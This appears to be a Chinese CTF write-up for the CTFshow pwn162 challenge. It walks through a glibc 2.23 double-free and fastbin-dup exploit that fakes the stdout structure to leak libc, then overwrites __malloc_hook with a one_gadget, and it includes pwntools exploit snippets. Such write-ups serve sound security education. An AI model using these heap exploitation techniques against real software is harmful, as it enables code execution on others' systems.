---
title: CTFshow pwn162 Double Free + stdout 泄露
published: 2026-04-17
updated: 2026-04-17
description: 先靠 double free 拿回伪造 chunk，再伪造 stdout 结构泄露 libc，最后第二次 fastbin dup 命中 __malloc_hook。
tags: [CTFshow, Pwn, Heap, Double Free, stdout, Fastbin]
category: ctfshow
draft: false
---

# 题目结论

`pwn162` 的关键不是单点漏洞，而是两段组合：

- 前半段利用 double free 拿到可控分配位置，再伪造 `_IO_2_1_stdout_` 相关结构泄露 libc
- 后半段再次 fastbin dup，把 chunk 打到 `__malloc_hook - 0x23`

## 利用链

1. 布局多个 note，使一个 `0x30` 小块能被后续 note 结构复用
2. 制造 unsorted bin，再把其中的低两字节改到 `stdout` 附近
3. 通过 fake stdout 拿到 libc 泄露
4. 再做一次 double free，命中 `__malloc_hook - 0x23`
5. 写入 `one_gadget` 和 `realloc + 0xd`
6. 触发下一次 `malloc`

## 关键 exp 片段

```python
delete(1)
delete(2)
delete(1)
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")
```

```python
fake_stdout = b"A" * 0x33 + p64(0xFBAD1800) + p64(0) * 3 + p8(0)
io.send(fake_stdout)
leak = u64(io.recv(6).ljust(8, b"\x00"))
```

```python
add(0x68, p64(malloc_hook - 0x23))
hook_payload = b"A" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 0xD)
add(0x68, hook_payload)
cmd(1)
```

## 下载

- [下载题目附件 `pwn`](../../../attachments/ctfshow/pwn162/pwn)
- [下载利用脚本 `exp.py`](../../../attachments/ctfshow/pwn162/exp.py)
- [下载对应 libc `libc-2.23.so`](../../../attachments/ctfshow/pwn162/libc-2.23.so)
- [下载原始笔记 `pwn162.md`](../../../attachments/ctfshow/pwn162/pwn162.md)

## 适合记住的点

fake stdout 依然是老版本 glibc 堆题里非常高频的 libc 泄露手法。只要能把分配命中 `_IO_2_1_stdout_` 附近，就要马上想到它。
